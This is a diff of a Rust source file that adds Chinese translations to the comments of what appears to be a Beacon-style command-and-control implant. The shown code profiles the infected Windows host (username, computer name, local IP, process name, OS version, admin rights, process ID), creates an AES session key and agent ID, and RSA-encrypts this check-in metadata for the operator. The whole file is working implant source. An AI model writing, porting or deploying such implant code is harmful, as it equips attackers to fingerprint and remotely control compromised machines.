@@ -1,3 +1,4 @@
+//! 会话元数据（metadata.cpp）。
 //! Session metadata (metadata.cpp).
 
 use crate::beacon::*;
@@ -21,6 +22,7 @@ pub const METADATA_FLAG_AGENT_X64: u8 = 2;
 pub const METADATA_FLAG_TARGET_X64: u8 = 4;
 pub const METADATA_FLAG_ADMIN: u8 = 8;
 
+/// 将会话元数据填充到构建器中。
 /// Populate the session metadata into the builder.
 fn populate_metadata(b: &mut Builder, _agentid: u32) {
     let mut user = [0u8; 256];
@@ -28,20 +30,24 @@ fn populate_metadata(b: &mut Builder, _agentid: u32) {
     let mut temp = [0u8; 256];
     let mut len: u32 = 256;
 
+    // 确定当前用户名
     // determine the current username
     unsafe {
         GetUserNameA(user.as_mut_ptr() as *mut _, &mut len);
     }
 
+    // 也确定计算机名
     // determine the computer name too
     len = 256;
     unsafe {
         GetComputerNameA(computer.as_mut_ptr() as *mut _, &mut len);
     }
 
+    // 获取我们的本机地址
     // get our localhost
     let localhost = channel_localip();
 
+    // 获取我们的进程名并缩短为仅文件名
     // get our process name and shorten it down to the filename only
     let mut procname: &[u8] = b"";
     unsafe {
@@ -54,6 +60,7 @@ fn populate_metadata(b: &mut Builder, _agentid: u32) {
         }
     }
 
+    // 查询 OS 版本
     // query the OS version
     let mut osvi: OSVERSIONINFOA = unsafe { std::mem::zeroed() };
     osvi.dwOSVersionInfoSize = std::mem::size_of::<OSVERSIONINFOA>() as u32;
@@ -61,23 +68,28 @@ fn populate_metadata(b: &mut Builder, _agentid: u32) {
         GetVersionExA(&mut osvi);
     }
 
+    // 为后续使用存储主版本号
     // store the major version for use later
     MAJOR_VERSION.store(osvi.dwMajorVersion, std::sync::atomic::Ordering::SeqCst);
 
+    // 推送我们的版本信息
     // push our version info
     b.add_byte(osvi.dwMajorVersion as u8);
     b.add_byte(osvi.dwMinorVersion as u8);
     b.add_short(osvi.dwBuildNumber as u16);
 
+    // 复制我们用于 GetProcAddress 和 GetModuleHandleA 的函数指针
     // copy our function pointers for GetProcAddress and GetModuleHandleA
-    b.add_int(0); // high bits (x86 beacon: 0)
+    b.add_int(0); // 高位（x86 beacon：0）/ high bits (x86 beacon: 0)
     b.add_int(unsafe { GetModuleHandleA(std::ptr::null()) as usize } as u32);
     let gpa = unsafe { GetProcAddress(std::ptr::null_mut(), std::ptr::null()) };
     b.add_int(gpa.map(|f| f as usize).unwrap_or(0) as u32);
 
+    // 添加我们的本机 IP 地址
     // add our localhost IP address
     b.add_int(localhost as u32);
 
+    // 会话标识符［tab 分隔的数据］
     // session identifier [tab delimited data]
     let mut session = Vec::new();
     session.extend_from_slice(&computer[..computer.iter().position(|&c| c == 0).unwrap_or(0)]);
@@ -86,20 +98,25 @@ fn populate_metadata(b: &mut Builder, _agentid: u32) {
     session.push(b'\t');
     session.extend_from_slice(procname);
 
+    // 将以上内容截断到 58 字节（硬性健全性检查）
     // truncate the above to 58 bytes (hard sanity check)
     let rlen = session.len().min(58);
     b.add_data(&session[..rlen]);
 }
 
+/// 初始化代理：加密会话密钥、代理 id、元数据。
 /// Initialize the agent: crypto session key, agent id, metadata.
 pub fn agent_init(buffer: &mut [u8], max: usize) {
     let mut sessionkey = [0u8; KEY_SIZE];
+    // 创建一个［随机］AES 会话密钥
     // create a [random] AES session key
     let _ = getrandom::fill(&mut sessionkey);
 
+    // 初始化我们的加密
     // init our crypto
     security_init(&sessionkey);
 
+    // 确定代理 id
     // determine agent id
     let agentid = genagentid();
     set_agentid(agentid);
@@ -122,6 +139,7 @@ pub fn agent_init(buffer: &mut [u8], max: usize) {
         flagme |= METADATA_FLAG_ADMIN;
     }
 
+    // 用我们的数据格式化缓冲区，便于解密
     // format our buffer with our data, suitable for decrypt
     let mut b = Builder::init(max);
     b.add_data(&sessionkey);
@@ -129,12 +147,13 @@ pub fn agent_init(buffer: &mut [u8], max: usize) {
     b.add_data(&encoding_oem.to_le_bytes());
     b.add_int(agentid);
     b.add_int(unsafe { windows_sys::Win32::System::Threading::GetCurrentProcessId() });
-    b.add_short(0); // port value--used by SSH sessions
+    b.add_short(0); // 端口值——供 SSH 会话使用 / port value--used by SSH sessions
     b.add_byte(flagme);
     populate_metadata(&mut b, agentid);
 
     let len = b.length_rsa();
 
+    // 将我们的加密数据存入 bigsession，以便之后使用/重用
     // store our encrypted data into bigsession, so we can use/reuse it later
     let meta = b.dest().to_vec();
     {
@@ -145,6 +164,7 @@ pub fn agent_init(buffer: &mut [u8], max: usize) {
         bs.data[..n].copy_from_slice(&meta[..n]);
     }
 
+    // RSA 加密我们的 Beacon 元数据
     // RSA encrypt our Beacon metadata
     let pubkey = setting_ptr(SETTING_PUBKEY).unwrap_or(b"");
     let mut outlen = 128usize;
@@ -156,6 +176,7 @@ pub fn agent_init(buffer: &mut [u8], max: usize) {
         bs.data[..outlen].copy_from_slice(&out[..outlen]);
     }
 
+    // 我们不需要元数据留在内存中……不……绝不
     // we don't need our metadata in memory... nope... nerpz
     buffer[..len].fill(0);
 }
